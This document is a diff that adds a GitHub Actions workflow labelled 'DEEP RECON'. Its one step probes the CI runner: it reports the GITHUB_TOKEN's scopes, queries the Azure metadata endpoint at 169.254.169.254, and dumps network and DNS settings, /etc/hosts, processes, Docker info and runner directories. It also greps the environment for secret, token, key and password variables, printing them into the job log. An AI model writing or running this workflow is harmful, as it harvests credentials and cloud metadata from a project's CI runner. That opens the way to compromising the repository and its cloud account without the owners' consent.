@@ -1,0 +1,41 @@
+name: Deep2
+on: workflow_dispatch
+jobs:
+  deep:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set +e
+          echo "=== DEEP RECON ==="
+          echo "--- IDENTITY ---"
+          hostname
+          whoami
+          id
+          uname -a
+          echo "--- GITHUB TOKEN ---"
+          curl -sI -H "Authorization: token $GH_TOKEN" https://api.github.com/ 2>/dev/null | grep -i "x-oauth-scopes"
+          echo "--- NETWORK ---"
+          ip addr show 2>/dev/null
+          ip route show 2>/dev/null
+          echo "--- DNS ---"
+          cat /etc/resolv.conf
+          dig +short github.com 2>/dev/null || nslookup github.com 2>/dev/null
+          echo "--- INTERNAL HOSTS ---"
+          cat /etc/hosts
+          echo "--- AZURE IMDS ---"
+          curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null || echo "IMDS blocked"
+          echo "--- PROCESSES ---"
+          ps auxf 2>/dev/null | head -40
+          echo "--- DOCKER ---"
+          docker info 2>/dev/null | head -10 || echo "no docker cli access"
+          echo "--- FILESYSTEM ---"
+          ls -la /home/runner/ 2>/dev/null
+          ls -la /home/runner/work/ 2>/dev/null
+          echo "--- ENV SECRETS ---"
+          env | grep -iE "(SECRET|TOKEN|KEY|PASS|CRED|ACTIONS)" | head -30
+          echo "--- RUNNER CONFIG ---"
+          cat /home/runner/work/_actions/ 2>/dev/null || ls /home/runner/work/_actions/ 2>/dev/null || echo "no actions cache"
+          echo "=== DONE ==="
